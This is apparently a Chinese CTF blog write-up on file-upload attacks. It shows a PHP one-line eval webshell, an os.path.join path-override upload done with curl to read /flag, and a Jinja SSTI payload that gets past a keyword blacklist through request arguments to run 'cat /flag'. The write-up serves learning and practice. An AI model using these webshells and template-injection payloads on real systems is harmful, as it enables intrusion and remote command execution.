---
title: "WEB_文件上传"
image: ''
pinned: false
comment: true
published: 2026-04-16
updated: 2026-04-18
description: "upload"
category: WEB
tags: [WEB]
---

文件上传，其实说简单点就是上传木马。

我们把我们常用的一句话木马写进文件中，上传给服务器，让服务器执行，与此同时，由于这个木马给了我们rce的接口，所有只要服务器上有了我们的木马文件，并执行了，我们就可以获得一个webshell，用来执行命令，获取我们想要的东西。

> https://www.cnblogs.com/linfangnan/p/13588709.html



```
<?php @eval($_POST['flag']) ?>
```

比如说这个最常见的一句话木马类型，post往flag这个参数中传入的所有内容都会被当作代码执行。

远程服务器如果有包含这句代码的文件，并且执行这个文件。

那么我们直接POST，flag=system('ls'); ，那么服务器就会执行ls，将当前的命令执行后的结果回显在网页上。



简单的介绍讲了，来点题目试一试吧。

![image-20260416204932590](/images/image-20260416204932590.png)

稍微测试后缀名，发现phtml可以上传，且存在执行权限。

```
<?php @eval($_POST['cmd']); ?>
```

上传木马，用中国蚁剑连接，然后看一看就找到flag了。

还挺简单的不是吗？？

确实，吃waf就老实了。



# 1.os.path.join 绝对路径覆盖

`[NISACTF 2022]babyupload`

初见直接开始上传任何文件，结果发现其实任何文件其实都上传不上去。

通过查看前端的网页源码，发现给了一个/source的路径，直接输入就可以下载到题目的源码。

在源码中存在一个函数`os.path.join`。

```
os.path.join("uploads/", res[0])
```

如果 res[0] 以 / 开头，比如 /flag，那么 os.path.join 的结果会直接变成绝对路径 /flag，前面的 uploads/ 会被忽略。
而上传时保存用的是字符串拼接：'uploads/' + '/flag' = 'uploads//flag'，这在 Linux 下等价于 uploads/flag，所以文件还能正常保存，服务端也会正常返回 /file/<uuid>。

所以利用这个漏洞点，我们上传一个文件名为/flag的文件，到服务器中。

因为这个漏洞，服务器就会将自己环境下的flag文件读出来给我们。

```
echo x > a
curl -i -X POST -F "file=@a;filename=/flag" http://node5.anna.nssctf.cn:23400/upload
```



----



# 2.文件上传配合ssti

`[GHCTF 2025]upload?SSTI!`

由于题目直接给了源码，所以可以直接看：

![image-20260417180704353](/images/image-20260417180704353.png)

![image-20260417180717283](/images/image-20260417180717283.png)

![image-20260417180736991](/images/image-20260417180736991.png)

![image-20260417180836185](/images/image-20260417180836185.png)

![image-20260417180919131](/images/image-20260417180919131.png)

- 上传接口只限制扩展名，允许 `txt/log/text/md/jpg/png/gif` 。
- 文本文件在查看时会先做一次关键字黑名单检测。
- 之后把文件内容拼进 HTML，再用 `render_template_string(tmp_str)` 渲染。

以我现在的能力，其实也能看懂大致的意思，但我确实没有一眼看到漏洞的眼力。

我自己在看的时候，看的出是要求特定后最然后又检查文件内容不能出现一下定义好的词。

不过如果联系题目的提示跟 `ssti` 有关，那我还真能找到这里，但是怎么用的话，还难说，因为我掌握的知识还不够。



危险词：

```
dangerous_keywords = ['_', 'os', 'subclasses', '__builtins__', '__globals__', 'flag'] 
```

它只检查“上传文件本身的内容”，不检查请求参数。

1. 上传一个不含黑名单关键词的 `Jinja payload`
2. 把真正危险的字符串放进 URL 参数
3. 模板里通过 request.args.xxx 动态取值，完成命令执行

这里用的 payload 是：

```
{{(lipsum|attr(request.args.a)).get(request.args.b)|attr(request.args.c)(request.args.d)|attr(request.args.e)()}} 
```

执行链含义：

```
lipsum -> attr('__globals__') -> get('os') -> attr('popen')('cat /flag') -> attr('read')() 
```

也就是：

```
lipsum.__globals__.get('os').popen('cat /flag').read() 
```

**利用过程**

先上传文本文件 ssti.txt，内容为上面的 payload。

然后访问：

```
http://node1.anna.nssctf.cn:27799/file/ssti.txt?a=__globals__&b=os&c=popen&d=cat%20/flag&e=read 
```

就可以拿到flag。

所谓 SSTI，本质上是服务端把用户输入当成模板语法解析了。由于模板引擎本身具备表达式求值和对象访问能力，攻击者可以构造恶意模板语句，在服务端执行未授权的操作；在条件满足时，进一步达到信息泄露、文件读取，甚至远程命令执行。



其实说实话，在这方面，我觉得要掌握就是考做题做题，不断积累哪些攻击链，积累多了即便存在一些黑名单也不会影响自己，还是题量不够。























---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
